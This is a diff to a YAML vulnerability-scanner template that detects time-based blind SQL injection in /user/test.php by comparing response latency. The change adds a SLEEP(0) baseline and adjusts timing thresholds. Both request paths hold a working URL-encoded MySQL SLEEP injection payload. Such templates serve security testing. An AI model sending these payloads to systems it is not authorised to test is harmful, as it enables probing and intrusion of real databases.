@@ -253,14 +253,14 @@ name: poc-yaml-test-sqli
 manual: true
 transport: http
 set:
-    sleepSecond: randomInt(4, 6)
+    sleepSecond: randomInt(5, 8)
 rules:
     r0:
         request:
             cache: true
             method: GET
-            path: /user/test.php?id=1
-        expression: response.status == 200
+            path: /user/test.php?id=1%27)%20AND%20(SELECT(SELECT(SLEEP(0))))%23
+        expression: 'true'
         output:
             r0latency: response.latency
     r1:
@@ -268,7 +268,7 @@ rules:
             cache: true
             method: GET
             path: /user/test.php?id=1%27)%20AND%20(SELECT(SELECT(SLEEP({{sleepSecond}}))))%23
-        expression: response.latency - r0latency >= sleepSecond * 1000 - 500
+        expression: response.latency - r0latency >= sleepSecond * 1000 - 1000
 expression: r0() && r1()
 detail:
     author: test
